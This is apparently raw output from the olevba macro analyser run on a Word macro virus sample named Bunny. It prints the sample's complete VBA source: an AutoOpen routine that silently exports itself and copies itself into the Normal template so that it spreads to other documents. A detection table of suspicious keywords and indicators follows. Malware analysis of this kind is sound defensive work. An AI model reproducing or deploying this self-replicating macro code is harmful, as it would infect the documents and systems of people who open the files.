olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bunny.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bunny.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bunnies.bas 
in file: Virus.MSWord.Bunny.a - OLE stream: 'Macros/VBA/Bunnies'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public SCode As String
' W97T/Bunnies .a
' Word Trojan Bunnies by Error
Sub AutoOpen()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Options.SaveNormalPrompt = False
SCode = Dir("C:\windows\system\bunnies.cpl")
If SCode = "bunnies.cpl" Then Call Spread Else
ActiveDocument.VBProject.VBComponents("Bunnies").Export ("C:\Windows\System\Bunnies.cpl")
End Sub
Function Spread()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
' Begin to do what bunnies do...
For X = 1 To 10000 Step 1
    With NormalTemplate.VBProject.VBComponents.Import("C:\Windows\System\Bunnies.cpl")
Next X
NormalTemplate.Save
MsgBox "Bunnies!!!!", 48
Kill "C:\Windows\System\Bunnies.cpl"
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |bunnies.cpl         |Executable file name                         |
|IOC       |Bunnies.cpl         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

